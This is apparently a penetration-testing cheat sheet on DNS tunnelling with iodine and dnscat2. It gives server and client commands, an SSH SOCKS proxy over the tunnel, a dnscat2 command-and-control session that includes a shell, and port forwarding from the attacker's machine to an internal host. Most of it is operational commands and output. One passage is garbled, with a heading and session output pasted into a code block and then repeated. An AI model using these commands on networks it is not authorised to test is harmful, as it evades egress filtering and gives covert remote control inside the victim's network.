## Establishing DNS tunnels

If any WAN traffic is blocked but external host names are resolved then there’s a possibility of tunneling traffic via DNS queries. 
You need a domain registered for this technique to work. 

- http://dev.kryo.se/iodine/wiki/HowtoSetup might help you with setting up your name server.


## Tunneling using Iodine

If so happens that you got root access on the server you can try http://code.kryo.se/iodine/

It works almost like hans ICMP tunneling tool - it creates a pair of tun adapters and tunnels data between them as DNS queries. 
Successful connection will yield direct client visibility at address 1.1.1.2. 

Running on the server side:

```bash
iodined -f -c -P hacker@hacker.com 1.1.1.1 tunneldomain.com
```

Running on the client side:

```bash
iodine -f -P hacker@hacker.com tunneldomain.com -r
```

Using a compressed ssh connection over the resulting connection:

```bash
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

## Tunneling using dnscat2

- https://github.com/iagox86/dnscat2 establishes C&C channel over recursive DNS queries. 

This tool doesn't require root/administrator access (works both on Windows and linux). 
It also supports port forwarding. 

Running on the server side:

```bash
ruby ./dnscat2.rb tunneldomain.com
```

Running on the client side:

```bash
./dnscat2 tunneldomain.com
```

Viewing active sessions:

```bash
dnscat2> windows
     0 :: main [active]
      dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]
      1 :: command session (debian)
      2 :: sh (debian) [*] 
1.1.2.4 Forwarding ports
This will bind port 8080 on the attacker’s machine and forward all connections to 10.0.0.20:80.
    dnscat2> session -i 1
    New window created: 1
    New window created: 1
    history_size (session) => 1000

   command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80
```

To initiate port forwarding select a command session with `session -i <num>`:

```bash
dnscat2> session -i 1
New window created: 1
New window created: 1
history_size (session) => 1000
This is a command session!
```   

That means you can enter a dnscat2 command such as 'ping'! For a full list of clients, try 'help'.


Use `listen [lhost:]lport rhost:rport` command to forward a port:

```bash
command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80
```

This will bind port 8080 on the attacker’s machine and forward all connections to `10.0.0.20:80`.
